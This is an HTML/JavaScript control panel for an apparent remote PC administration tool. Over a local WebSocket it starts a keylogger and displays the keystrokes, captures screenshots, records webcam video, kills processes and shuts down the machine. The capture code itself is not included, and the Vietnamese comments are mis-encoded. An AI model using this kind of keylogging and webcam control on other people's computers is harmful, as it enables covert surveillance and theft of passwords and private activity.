<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Remote PC Control - Final</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background-color: #f0f2f5; color: #333; }
        .container { max-width: 1200px; margin: 20px auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
        
        h1 { text-align: center; color: #2c3e50; margin-bottom: 20px; }
        h2 { border-bottom: 2px solid #007bff; padding-bottom: 5px; color: #007bff; margin-top: 30px; }
        
        .section { margin-bottom: 20px; padding: 15px; background: #f8f9fa; border-radius: 8px; border: 1px solid #e9ecef; }
        
        .controls { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
        
        input[type="text"], input[type="number"] { padding: 8px; border: 1px solid #ced4da; border-radius: 4px; flex-grow: 1; max-width: 300px; }
        
        button { padding: 8px 16px; border: none; border-radius: 4px; cursor: pointer; font-weight: 600; transition: all 0.2s; color: white; background-color: #6c757d; }
        button:hover { opacity: 0.9; transform: translateY(-1px); }
        button:active { transform: translateY(0); }
        
        .btn-primary { background-color: #007bff; }
        .btn-danger { background-color: #dc3545; }
        .btn-warning { background-color: #ffc107; color: #212529; }
        .btn-success { background-color: #28a745; }
        .btn-info { background-color: #17a2b8; }
        .btn-dark { background-color: #343a40; }

        /* Log console */
        .log-box { background-color: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 6px; height: 150px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 0.85em; margin-top: 20px; border: 1px solid #444; }
        
        /* Keylogger Output Area */
        #keylog-area {
            width: 100%;
            height: 150px;
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 4px;
            margin-top: 10px;
            box-sizing: border-box; /* ƒê·ªÉ padding kh√¥ng l√†m v·ª° layout */
            resize: vertical;
        }

        /* Table styles */
        table { width: 100%; border-collapse: collapse; margin-top: 10px; background: white; }
        th, td { border: 1px solid #dee2e6; padding: 10px; text-align: left; font-size: 0.9em; }
        th { background-color: #e9ecef; color: #495057; }
        tr:hover { background-color: #f1f1f1; }

        /* Screenshot area */
        #screen-wrapper { text-align: center; margin-top: 10px; }
        #screen-image { max-width: 100%; border: 2px solid #333; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
    </style>
</head>
<body>

    <div class="container">
        <h1>üì° Remote Control Panel</h1>

        <div class="section">
            <div class="controls">
                <button id="btn-connect" class="btn-info" onclick="connectWS()">üîå Connect (9010)</button>
                <div style="flex-grow: 1;"></div>
                <button class="btn-warning" onclick="restartSystem()">üîÑ Restart PC</button>
                <button class="btn-danger" onclick="shutdownSystem()">üõë Shutdown PC</button>
            </div>
        </div>

        <div class="section" style="border-left: 5px solid #dc3545;">
            <h2>‚å®Ô∏è Keylogger Monitor</h2>
            <div class="controls">
                <button class="btn-danger" onclick="startKeylogger()">‚ñ∂ Start Hook</button>
                <button class="btn-dark" onclick="stopKeylogger()">‚èπ Stop Hook</button>
                <button class="btn-warning" onclick="clearKeylog()">üßπ Clear Log</button>
            </div>
            <textarea id="keylog-area" readonly placeholder="Keystrokes will appear here..."></textarea>
        </div>

        <div class="section">
            <h2>üì¶ Application Manager</h2>
            <div class="controls">
                <button class="btn-primary" onclick="listApps()">üìÇ List Apps</button>
                <input type="text" id="app-keyword" placeholder="App name (e.g., chrome, code)">
                <button class="btn-danger" onclick="killAppUI()">‚ò†Ô∏è Kill App</button>
                <input type="text" id="app-start-path" placeholder="Path to start (e.g., notepad)">
                <button class="btn-success" onclick="startAppUI()">üöÄ Start App</button>
            </div>
            <table id="app-table">
                <thead><tr><th>Executable</th><th>Count</th><th>Action</th></tr></thead>
                <tbody id="app-table-body"><tr><td colspan="3" style="text-align:center">No data</td></tr></tbody>
            </table>
        </div>

        <div class="section">
            <h2>‚öôÔ∏è Process Manager</h2>
            <div class="controls">
                <button class="btn-primary" onclick="listProcesses()">üìÇ List Processes</button>
                <input type="number" id="kill-pid" placeholder="PID to Kill" style="max-width: 150px;">
                <button class="btn-danger" onclick="killProcessUI()">‚ò†Ô∏è Kill PID</button>
            </div>
            <div style="max-height: 200px; overflow-y: auto; margin-top: 10px; border: 1px solid #ddd;">
                <table id="process-table">
                    <thead><tr><th>PID</th><th>Name</th><th>Threads</th><th>Action</th></tr></thead>
                    <tbody id="process-table-body"></tbody>
                </table>
            </div>
        </div>

        <div class="section">
            <h2>üì∏ Screen Capture</h2>
            <div class="controls">
                <button class="btn-success" onclick="captureScreen()">üì∑ Take Screenshot</button>
            </div>
            <div id="screen-wrapper">
                <img id="screen-image" alt="Screenshot will appear here...">
            </div>
        </div>
        <h2>üìπ Webcam Recorder</h2>
            <div class="controls">
                <label>Duration (sec): </label>
                <input type="number" id="cam-duration" value="5" min="1" max="10" style="max-width: 60px;">
                <button class="btn-danger" onclick="recordWebcamUI()">üî¥ Record Video</button>
            </div>
            
            <div style="text-align: center; margin-top: 15px;">
                <p id="cam-status" style="display: none; color: #e67e22; font-weight: bold; animation: blink 1s infinite;">
                    üé• Recording in progress... Please wait...
                </p>
                
                <video id="webcam-video" controls style="max-width: 100%; border: 2px solid #333; border-radius: 4px; display: none; box-shadow: 0 4px 12px rgba(0,0,0,0.3);">
                    Your browser does not support the video tag.
                </video>
            </div>
        <h3>üñ•Ô∏è System Log</h3>
        <div class="log-box" id="output"></div>
    </div>

    <script>
        let ws = null;
        const WS_URL = 'ws://127.0.0.1:9010'; 

        const output = document.getElementById('output');
        const screenImg = document.getElementById('screen-image');
        const keylogArea = document.getElementById('keylog-area'); // Khu v·ª±c hi·ªÉn th·ªã ph√≠m

        function logStatus(message, color = 'white') {
            const time = new Date().toLocaleTimeString();
            output.innerHTML += `<div style="color:${color}; margin-bottom: 2px;">[${time}] ${message}</div>`;
            output.scrollTop = output.scrollHeight;
        }

        // --- WEBSOCKET ---
        function connectWS() {
            if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
                logStatus('‚ö† Already connecting or connected.', 'yellow');
                return;
            }
            logStatus(`Connecting to ${WS_URL}...`, 'cyan');
            ws = new WebSocket(WS_URL);

            ws.onopen = () => {
                logStatus('‚úÖ Connected to Server!', '#00ff00');
                document.getElementById('btn-connect').innerText = "‚úÖ Connected";
            };
            ws.onclose = () => {
                logStatus('‚ùå Disconnected.', 'red');
                document.getElementById('btn-connect').innerText = "üîå Connect";
            };
            ws.onerror = (e) => logStatus('‚ùå WebSocket Error.', 'red');

            ws.onmessage = (event) => {
                try {
                    const response = JSON.parse(event.data);
                    handleServerResponse(response);
                } catch (e) {
                    logStatus('‚ùå Invalid JSON received', 'red');
                }
            };
        }

        function sendCommand(module, command, payload = {}) {
            if (!ws || ws.readyState !== WebSocket.OPEN) {
                logStatus('‚ö† Not connected!', 'red');
                return;
            }
            const msg = { module, command, payload };
            ws.send(JSON.stringify(msg));
            // logStatus(`üì§ SENT [${module} - ${command}]`, '#00bfff');
        }

        // --- KEYLOGGER FUNCTIONS ---
        function startKeylogger() {
            sendCommand('KEYBOARD', 'START');
            logStatus("Requesting Keylogger Start...", "orange");
        }
        function stopKeylogger() {
            sendCommand('KEYBOARD', 'STOP');
            logStatus("Requesting Keylogger Stop...", "orange");
        }
        function clearKeylog() {
            keylogArea.value = "";
        }

        // --- APP & PROCESS FUNCTIONS ---
        function listApps() { sendCommand('APP', 'LIST'); }
        function killAppUI() { 
            const name = document.getElementById('app-keyword').value; 
            if(name) sendCommand('APP', 'KILL', { name }); 
        }
        function startAppUI() {
            const path = document.getElementById('app-start-path').value;
            if(path) sendCommand('APP', 'START', { path });
        }
        function listProcesses() { sendCommand('PROCESS', 'LIST'); }
        function killProcessUI() {
            const pid = document.getElementById('kill-pid').value;
            if(pid) sendCommand('PROCESS', 'KILL', { pid: parseInt(pid) });
        }
        function killProcessByPID(pid) { sendCommand('PROCESS', 'KILL', { pid: parseInt(pid) }); }
        function killAppByName(name) { sendCommand('APP', 'KILL', { name: name }); }

        // --- SYSTEM & SCREEN ---
        function shutdownSystem() { if(confirm('Shutdown PC?')) sendCommand('SYSTEM', 'SHUTDOWN'); }
        function restartSystem() { if(confirm('Restart PC?')) sendCommand('SYSTEM', 'RESTART'); }
        function captureScreen() { sendCommand('SCREEN', 'CAPTURE'); }

        // --- WEBCAM FUNCTIONS ---
        function recordWebcamUI() {
            const durationInput = document.getElementById('cam-duration');
            let duration = parseInt(durationInput.value) || 5;
            
            // Gi·ªõi h·∫°n 10 gi√¢y ƒë·ªÉ tr√°nh treo server qu√° l√¢u
            if (duration > 10) duration = 10;
            if (duration < 1) duration = 1;
            durationInput.value = duration;

            // G·ª≠i l·ªánh
            sendCommand('WEBCAM', 'RECORD', { duration: duration });

            // C·∫≠p nh·∫≠t UI
            document.getElementById('cam-status').style.display = 'block'; // Hi·ªán ch·ªØ ƒëang quay
            document.getElementById('webcam-video').style.display = 'none'; // ·∫®n video c≈©
            logStatus(`üé• Requesting ${duration}s webcam recording... (Server will be busy)`, 'orange');
        }

        // --- RESPONSE HANDLER ---
        function handleServerResponse(res) {
            if (res.status === 'error') {
                logStatus(`‚õî ERROR: ${res.message}`, 'red');
                return;
            }

            // 1. X·ª≠ l√Ω KEYLOGGER
            if (res.module === 'KEYBOARD' && res.command === 'PRESS') {
                const key = res.data.key;
                
                // X·ª≠ l√Ω hi·ªÉn th·ªã cho ƒë·∫πp
                if (key === '[ENTER]\n' || key === '[ENTER]') {
                    keylogArea.value += '\n';
                } else if (key === '[BACKSPACE]') {
                    keylogArea.value = keylogArea.value.slice(0, -1);
                } else if (key === '[TAB]') {
                    keylogArea.value += '\t';
                } else {
                    keylogArea.value += key;
                }
                
                keylogArea.scrollTop = keylogArea.scrollHeight; // T·ª± cu·ªôn xu·ªëng d∆∞·ªõi
                return; // Kh√¥ng log v√†o console ch√≠nh ƒë·ªÉ tr√°nh r√°c
            }

            // 2. X·ª≠ l√Ω APP
            if (res.module === 'APP') {
                if (res.command === 'LIST') {
                    displayApps(res.apps);
                    logStatus(`‚úÖ Listed ${res.apps.length} applications.`, '#00ff00');
                } else if (res.command === 'KILL') {
                    logStatus(`‚ò†Ô∏è Killed ${res.data.killed_count} processes ("${res.data.keyword}")`, 'orange');
                    setTimeout(listApps, 500);
                } else if (res.command === 'START') {
                    logStatus(`üöÄ Started PID: ${res.pid}`, '#00ff00');
                }
            }

            // 3. X·ª≠ l√Ω PROCESS
            else if (res.module === 'PROCESS') {
                if (res.command === 'LIST') {
                    const list = res.data.process_list || res.data;
                    displayProcesses(list);
                    logStatus(`‚úÖ Listed ${list.length} processes.`, '#00ff00');
                } else if (res.command === 'KILL') {
                    logStatus(`‚ò†Ô∏è PID ${res.pid} killed.`, 'orange');
                    listProcesses();
                }
            }

            // 4. X·ª≠ l√Ω SCREEN
            else if (res.module === 'SCREEN' && res.command === 'CAPTURE') {
                if (res.image_base64) {
                    const mime = (res.format === 'PNG') ? 'image/png' : 'image/bmp';
                    screenImg.src = `data:${mime};base64,${res.image_base64}`;
                    logStatus("üì∏ Screenshot received.", "#00ffcc");
                }
            }

            // 5. X·ª≠ l√Ω STATUS (Start/Stop Keylogger ph·∫£n h·ªìi)
            else if (res.module === 'KEYBOARD' && (res.command === 'START' || res.command === 'STOP')) {
                logStatus(`‚ÑπÔ∏è ${res.message}`, 'cyan');
            }

            // 6. X·ª≠ l√Ω WEBCAM (M·ªöI)
            else if (res.module === 'WEBCAM' && res.command === 'RECORD_RESULT') {
                // ·∫®n th√¥ng b√°o "ƒêang quay"
                document.getElementById('cam-status').style.display = 'none';

                if (res.status === 'success' && res.data) {
                    try {
                        // --- GI·∫¢I M√É BASE64 SANG BINARY ---
                        const binaryString = window.atob(res.data);
                        const len = binaryString.length;
                        const bytes = new Uint8Array(len);
                        for (let i = 0; i < len; i++) {
                            bytes[i] = binaryString.charCodeAt(i);
                        }

                        // --- T·∫†O BLOB URL ---
                        // Server tr·∫£ v·ªÅ H.264 trong MP4 container
                        const blob = new Blob([bytes], { type: 'video/mp4' });
                        const videoUrl = URL.createObjectURL(blob);

                        // --- HI·ªÇN TH·ªä VIDEO ---
                        const videoPlayer = document.getElementById('webcam-video');
                        videoPlayer.src = videoUrl;
                        videoPlayer.style.display = 'block';
                        videoPlayer.play(); // T·ª± ƒë·ªông ph√°t

                        logStatus(`‚úÖ Received video (${(len / 1024 / 1024).toFixed(2)} MB).`, '#00ff00');
                    } catch (e) {
                        logStatus('‚ùå Error processing video data: ' + e.message, 'red');
                    }
                } else {
                    logStatus(`‚ùå Webcam Failed: ${res.message}`, 'red');
                }
            }
            
        }

        // --- UI RENDERING ---
        function displayApps(apps) {
            const tbody = document.getElementById('app-table-body');
            tbody.innerHTML = '';
            if (!apps || apps.length === 0) {
                tbody.innerHTML = '<tr><td colspan="3" style="text-align:center">No apps found</td></tr>'; return;
            }
            apps.sort((a, b) => a.exe.localeCompare(b.exe));
            apps.forEach(app => {
                const row = tbody.insertRow();
                row.insertCell().innerHTML = `<b>${app.exe}</b>`;
                row.insertCell().textContent = app.count;
                const btn = document.createElement('button');
                btn.textContent = "Kill All";
                btn.className = "btn-danger";
                btn.style.padding = "2px 8px";
                btn.onclick = () => killAppByName(app.exe);
                row.insertCell().appendChild(btn);
            });
        }

        function displayProcesses(procs) {
            const tbody = document.getElementById('process-table-body');
            tbody.innerHTML = '';
            procs.slice(0, 300).forEach(p => { // Limit 300
                const row = tbody.insertRow();
                row.insertCell().textContent = p.pid;
                row.insertCell().textContent = p.name;
                row.insertCell().textContent = p.threads || '-';
                const btn = document.createElement('button');
                btn.textContent = "X";
                btn.className = "btn-danger";
                btn.style.padding = "2px 6px";
                btn.onclick = () => killProcessByPID(p.pid);
                row.insertCell().appendChild(btn);
            });
        }

        connectWS();
    </script>
</body>
</html>